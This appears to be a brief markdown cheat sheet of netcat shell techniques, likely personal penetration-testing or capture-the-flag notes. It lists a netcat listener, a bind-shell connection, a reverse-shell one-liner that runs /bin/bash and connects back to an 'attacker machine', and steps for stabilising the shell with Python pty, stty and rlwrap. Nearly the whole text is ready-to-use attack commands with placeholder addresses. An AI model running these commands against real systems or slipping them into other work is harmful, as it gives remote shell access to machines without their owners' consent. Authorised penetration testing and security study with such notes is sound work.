### Basics
```
nc -lnvp <port>
```
listen for incoming connection on port.
_use sudo when port is below 1024._
_443 is a good port to use._
```
nc <ip> <port>
```
bind shell.
___
### Reverse shell
```
sudo nc -e /bin/bash <ip>
```
connect to attacker machine using bash.
_Effectively establish a reverse shell._
___
### Stabilisation
#### Using Python
```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
Then `Ctrl + Z` 
```
stty raw -echo; fg
```
#### Using rlwrap
```
rlwrap nc -lnvp <port>
```
